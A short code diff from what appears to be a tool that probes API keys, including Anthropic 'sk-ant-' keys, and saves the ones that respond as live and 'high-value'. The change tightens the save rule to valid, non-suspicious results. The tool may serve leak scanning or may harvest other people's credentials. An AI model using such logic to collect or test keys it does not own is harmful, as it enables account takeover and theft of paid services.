@@ -30,8 +30,7 @@ HIGH_VALUE_PREFIXES = (
     "sk-ant-",  # Anthropic (Claude) keys
 )
 
-# Status codes that indicate the key is alive (worth saving).
-ALIVE_STATUS_CODES = {200, 429}
+ALIVE_STATUS_CODES = {200}
 
 # Thread-safe lock for file appending (validate_all uses asyncio.gather
 # which runs in one thread, but prober runs in a thread pool).
@@ -66,7 +65,7 @@ def should_save(result: ValidationResult) -> bool:
     """Determine whether this validation result should be saved as high-value."""
     key = result.credential.apikey
     status = result.status_code
-    return is_high_value_key(key) and is_alive_status(status)
+    return result.valid and not result.suspicious and is_high_value_key(key) and is_alive_status(status)
 
 
 def save_high_value_key(result: ValidationResult, run_id: str | None = None) -> bool:
